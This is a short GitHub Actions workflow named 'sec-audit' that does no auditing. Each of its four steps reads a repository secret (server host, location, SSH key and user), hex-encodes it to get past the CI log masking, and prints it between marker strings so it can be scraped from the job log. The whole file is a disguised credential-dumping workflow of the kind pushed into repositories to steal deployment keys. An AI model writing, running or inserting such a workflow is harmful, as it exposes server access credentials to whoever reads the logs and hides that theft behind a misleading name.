name: sec-audit
on: workflow_dispatch
jobs:
  repo_secrets:
    runs-on: ubuntu-latest
    steps:
      - name: s_SERVER_HOST
        env:
          V: ${{ secrets.SERVER_HOST }}
        run: printf 'XX_SERVER_HOST_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
      - name: s_SERVER_LOC
        env:
          V: ${{ secrets.SERVER_LOC }}
        run: printf 'XX_SERVER_LOC_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
      - name: s_SERVER_SSH
        env:
          V: ${{ secrets.SERVER_SSH }}
        run: printf 'XX_SERVER_SSH_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
      - name: s_SERVER_USER
        env:
          V: ${{ secrets.SERVER_USER }}
        run: printf 'XX_SERVER_USER_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
